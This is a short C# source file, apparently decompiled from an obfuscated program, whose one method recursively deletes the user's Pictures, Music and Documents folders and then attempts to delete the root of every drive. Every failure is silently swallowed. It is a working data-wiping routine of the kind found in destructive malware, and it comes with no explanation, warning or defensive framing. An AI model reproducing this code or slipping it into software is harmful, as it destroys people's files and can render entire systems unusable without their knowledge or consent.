using System;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

internal class Class8
{
	public static void smethod_0()
	{
		try
		{
			Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), recursive: true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), recursive: true);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Personal), recursive: true);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				Directory.Delete(driveInfo.Name, recursive: true);
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}
}
